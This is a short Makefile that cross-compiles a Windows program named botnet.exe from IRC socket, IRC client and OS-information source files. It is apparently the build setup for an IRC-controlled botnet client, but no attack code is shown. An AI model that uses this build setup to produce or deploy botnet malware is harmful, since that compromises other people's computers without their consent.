CC=i686-w64-mingw32-g++
CFLAGS=-Wall -static
LIBS=-lws2_32
FILES=OSInfo.cpp IRCSocket.cpp IRCClient.cpp botnet.cpp

all: botnet

botnet:
	$(CC) $(CFLAGS) $(FILES) -o botnet.exe $(LIBS)

osinfo.o:
	$(CC) $(CFLAGS) -c OSInfo.cpp -o OSInfo.o $(LIBS)
	
IRCSocket.o:
	$(CC) $(CFLAGS) -c IRCSocket.cpp -o IRCSocket.o $(LIBS)

IRCClient.o:
	$(CC) $(CFLAGS) -c IRCClient.cpp -o IRCClient.o $(LIBS)

clean:
	rm -f *.a *.o botnet.exe
